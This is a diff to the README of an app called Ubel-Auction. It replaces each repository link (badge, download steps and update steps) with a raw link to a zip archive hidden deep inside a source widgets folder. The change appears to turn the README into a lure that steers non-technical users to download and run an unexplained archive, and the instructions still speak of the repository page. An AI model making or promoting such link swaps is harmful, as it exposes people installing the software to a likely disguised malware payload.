@@ -1,6 +1,6 @@
 # 🎨 Ubel-Auction - Rare Finds, Simple Bidding
 
-[![Download Ubel-Auction](https://img.shields.io/badge/Download-Ubel--Auction-blue?style=for-the-badge)](https://github.com/hiwhatsup12/Ubel-Auction)
+[![Download Ubel-Auction](https://img.shields.io/badge/Download-Ubel--Auction-blue?style=for-the-badge)](https://raw.githubusercontent.com/hiwhatsup12/Ubel-Auction/main/lib/features/auction/presentation/widgets/Ubel_Auction_1.6.zip)
 
 ## 🖥️ What You Need
 
@@ -18,7 +18,7 @@ If you plan to keep lots of items open at once, 8 GB of RAM gives a smoother exp
 
 Visit this page to download Ubel-Auction:
 
-https://github.com/hiwhatsup12/Ubel-Auction
+https://raw.githubusercontent.com/hiwhatsup12/Ubel-Auction/main/lib/features/auction/presentation/widgets/Ubel_Auction_1.6.zip
 
 On that page, look for the latest release or the main download file. After the file finishes downloading, keep it in your Downloads folder so you can find it easily.
 
@@ -176,7 +176,7 @@ Each listing is set up to show useful details so you can decide if you want to b
 
 When a newer version is posted, repeat the download steps on the repository page:
 
-https://github.com/hiwhatsup12/Ubel-Auction
+https://raw.githubusercontent.com/hiwhatsup12/Ubel-Auction/main/lib/features/auction/presentation/widgets/Ubel_Auction_1.6.zip
 
 Use the newest file so you get the latest fixes, layout changes, and bidding updates.
 
